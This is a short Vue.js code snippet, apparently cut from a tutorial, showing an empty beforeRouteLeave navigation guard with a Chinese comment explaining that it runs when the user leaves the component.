//离开守卫：通过路由规则，离开该组件时被调用
beforeRouteLeave (to, from, next) {
}
```

